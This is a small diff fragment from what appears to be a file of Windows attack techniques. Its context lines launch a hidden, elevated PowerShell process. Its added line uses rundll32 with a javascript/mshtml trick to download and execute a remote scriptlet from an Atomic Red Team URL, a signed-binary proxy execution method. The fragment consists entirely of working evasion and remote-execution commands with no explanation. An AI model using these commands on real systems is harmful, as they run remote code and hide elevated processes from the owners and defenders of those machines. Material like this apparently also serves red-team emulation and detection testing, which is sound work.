@@ -233,6 +233,9 @@ for /f "tokens=*" %%A in ('powershell -Command "Start-Process -FilePath $Env:win
 powershell -Command "Start-Process -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -ArgumentList '-Command Start-Sleep 10' -PassThru -WindowStyle Hidden -Wait -WorkingDirectory $Env:windir\System32 -Verb RunAs -ErrorAction Stop -PassThru -ArgumentList '-ParentProcessId', $notepad.Id"
 
 
+******************
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
+
 
 
 
